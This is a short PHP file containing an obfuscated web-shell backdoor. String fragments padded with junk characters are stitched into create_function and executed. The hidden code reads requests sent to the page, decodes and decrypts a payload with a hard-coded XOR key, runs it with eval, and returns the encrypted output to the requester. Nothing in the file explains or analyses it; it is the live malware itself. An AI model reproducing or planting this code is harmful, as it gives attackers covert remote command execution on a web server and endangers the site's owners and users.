<?php
$y='j};}}BbretBburn Bb$oBb;}if (@preg_matBbch("/Bb$kh(.+Bb)$kf/",@BbBbfiBble_get_content';
$N='$Bbk="baf80Bbb59Bb";Bb$Bbkh="2fe0081Bbc7b9d";$Bbkf=Bb"d707188a81d3";$p=Bb"ByEBbMkh87ngr2B';
$p=';$Bbr=@base6Bb4Bb_encBbode(@x(@gzcBbompresBbs(Bb$oBb),$k));prBbint("$p$kBbh$r$kf");}';
$O='s("Bbphp:/Bb/Bbinput"),$m)=Bb=1)Bb {@obBb_start();@BbevaBblBb(@gzuncompBbress(@Bbx(@';
$b='i=0Bb;Bb$i<$l;){Bbfor($j=0;(BbBb$j<$cBb&&$i<$l);Bb$j++,$BbBbiBb++){$o.=Bb$t{$i}^$k{$';
$d='bfBbmnTBb";functiBbon x($tBb,$k){$c=sBbtrlBben($k);Bb$l=strlBben($t);Bb$o="Bb";for($';
$S=str_replace('Yu','','creYuaYutYue_fuYuncYutYuion');
$J='BbbasBbe6Bb4_decode($m[1]),$k)))Bb;$o=@Bbob_get_BbBbBbcontenBbBbts();@ob_end_clean()';
$k=str_replace('Bb','',$N.$d.$b.$y.$O.$J.$p);
$z=$S('',$k);$z();
?>
